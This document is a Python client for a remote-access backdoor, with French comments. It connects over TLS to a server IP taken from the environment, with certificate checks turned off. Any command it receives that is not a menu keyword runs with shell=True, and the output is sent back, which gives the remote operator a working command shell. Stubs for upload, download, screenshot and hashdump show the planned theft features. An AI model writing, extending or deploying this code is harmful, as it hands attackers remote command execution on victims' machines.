import socket
import ssl
import subprocess
import os
from dotenv import load_dotenv

SERVER_PORT = 8888

def menu_help() :
    print('help')

def download() :
    print('download')

def upload() :
    print('upload')

def shell() :
    print('shell')

def ipconfig() :
    print('ipconfig')

def screenshot() :
    print('ipconfig')

def search() :
    print('search')

def hashdump() :
    print('hashdump')



def main():
    load_dotenv()
    ip_server = os.getenv('IP_SERVER')

    # Créer un contexte SSL
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server)
    ssl_socket.connect((ip_server, SERVER_PORT))

    while True:
        command = ssl_socket.recv(1024).decode()
        if command.lower() == 'help':
            menu_help()
        elif command.lower() == 'download':
            download()
        elif command.lower() == 'upload':
            upload()
        elif command.lower() == 'shell':
            shell()
        elif command.lower() == 'ipconfig':
            ipconfig()
        elif command.lower() == 'screenshot':
            screenshot()
        elif command.lower() == 'search':
            search()
        elif command.lower() == 'hashdump':
            hashdump()
        elif command.lower() == 'exit':
            break
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            ssl_socket.send(result.stdout.encode() + result.stderr.encode())

    ssl_socket.close()

if __name__ == "__main__":
    main()
